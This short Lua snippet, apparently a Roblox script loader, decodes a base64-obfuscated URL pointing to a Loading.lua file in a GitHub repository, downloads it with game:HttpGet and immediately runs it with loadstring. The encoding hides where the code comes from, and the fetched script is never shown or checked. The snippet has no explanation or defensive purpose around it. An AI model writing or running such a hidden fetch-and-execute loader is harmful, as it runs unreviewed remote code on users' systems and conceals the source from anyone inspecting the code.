local encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0NhY2h1b2luZS9ESEwvcmVmcy9oZWFkcy9tYWluL0xvYWRpbmcubHVh"
local decoded_url = base64_decode(encoded_url) 
loadstring(game:HttpGet(decoded_url))()
